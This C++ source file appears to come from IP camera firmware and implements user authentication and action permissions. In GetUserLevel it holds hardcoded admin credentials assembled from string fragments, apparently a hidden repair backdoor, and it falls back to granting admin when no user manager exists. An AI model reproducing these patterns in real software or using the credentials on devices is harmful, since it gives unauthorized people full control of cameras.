#include "stdafx.h"
#include "auth/authman.h"
#include "auth/userman.h"
#include "ajaxhandler.h"
using namespace Bear;
using namespace Bear::Core;
using namespace Bear::Core::Net::Http;
UserInfo::UserInfo()
{
	mUserLevel=eUser_Invalid;
}

UserInfo::~UserInfo()
{
}

//IUserInfo#begin
void UserInfo::SetUserPassword(string user,string password)
{
	mUser=user;
	mPassword=password;
	mUserLevel=GetUserLevel(user,password);
}

void UserInfo::SetUserLevel(eUserLevel userLevel)
{
	mUserLevel=userLevel;
}

eUserLevel UserInfo::GetUserLevel(string user,string password)
{
#ifdef _CONFIG_MTK6572
	if (user == "JJY" + string(".") + string("IPCam")
		&& password == "JJY" + string(".") + string("Bear")+"."+string("Repair")
		)
	{
		return eUser_Admin;
	}
#endif

	if (mUserMan)
	{
		return mUserMan->GetUserLevel(user, password);
	}

	return eUser_Admin;
	//return eUser_Invalid;
}

bool UserInfo::HasAuth(string action)
{
	eUserLevel level = GetCurUserLevel();
	if (level == eUser_Admin)
	{
		return true;
	}

	return IsAuthAction(action);
}

//当前用户是否有权执行pszAction操作
//pszUserGroup为NULL时，返回当前用户的操作权限，否则返回pszUserGroup用户组的权限.
bool UserInfo::IsAuthAction(const char *pszAction,const char *pszUserGroup)
{
	if (!pszAction || pszAction[0] == 0)
	{
		return false;
	}

	eUserLevel usrLevel = GetCurUserLevel();
	if(pszUserGroup)
	{
		if(StringTool::stricmp(pszUserGroup,IDS_OPERATOR)==0)
			usrLevel=eUser_Operator;
		else if(StringTool::stricmp(pszUserGroup,IDS_GUEST)==0)
			usrLevel=eUser_Guest;
		else
			usrLevel=eUser_Admin;
	}

	if(usrLevel == eUser_Admin)
		return TRUE;
	if(usrLevel==eUser_Invalid)
		return FALSE;

	struct tagActionLevel
	{
		const char *action;
		eUserLevel maxLevel;
	};

	static const tagActionLevel arr[]=
	{
		"Rtsp",					eUser_Guest,
		"Ptz",					eUser_Operator,
		"DeviceConfig",			eUser_Admin,		//reboot,exit
		"DeviceConfig.UserMan",	eUser_Admin,		//add/edit/delete user

	};

#ifdef _DEBUG
	{
		static bool first = true;
		if (first)
		{
			first = false;

			//确保所有arr中包含了IMPLEMENT_AJAX_CLASS指定的权限,避免遗漏
			if (AjaxRuntimeClass::m_mapPackClass)
			{
				for (auto iter = AjaxRuntimeClass::m_mapPackClass->begin(); iter != AjaxRuntimeClass::m_mapPackClass->end(); ++iter)
				{
					if (!iter->second->mPermission.empty())
					{
						bool found = false;
						for (int i = 0; i < _countof(arr); i++)
						{
							if (strcmp(iter->second->mPermission.c_str(), arr[i].action) == 0)
							{
								found = true;
								break;
							}
						}

						if (!found)
						{
							//需要在tagActionLevel arr中注册
							DW("unbind permission:%s for ajax command %s",
								iter->second->mPermission.c_str(),
								iter->second->mCommandName.c_str()
							);
							ASSERT(FALSE);
						}
					}
				}
			}
		}

	}
#endif
	
	//用map效率更高些
	for (int i = 0; i < _countof(arr); i++)
	{
		if (strcmp(pszAction, arr[i].action) == 0)
		{
			return usrLevel <= arr[i].maxLevel;
		}
	}

	return false;
}
//IUserInfo#end
